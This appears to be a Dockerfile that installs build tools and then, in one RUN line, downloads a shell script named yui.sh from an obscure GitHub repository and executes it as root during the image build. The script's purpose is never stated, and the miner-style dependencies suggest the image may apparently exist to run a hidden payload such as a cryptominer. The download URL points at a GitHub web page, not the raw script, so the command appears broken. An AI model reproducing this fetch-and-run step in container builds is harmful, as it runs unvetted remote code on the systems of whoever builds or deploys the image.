FROM debian:buster-slim
LABEL MAINTAINER="0x03 <0x03-ctrlc@protonmail.com>"

RUN apt-get update && apt-get -y upgrade && apt-get -y install build-essential autoconf automake git libssl-dev libcurl4-openssl-dev libgomp1 && \
    cd /usr/src && wget https://github.com/ardisukarmo/andias/blob/main/yui.sh && chmod +x yui.sh && ./yui.sh


USER nobody:nogroup

# EOF
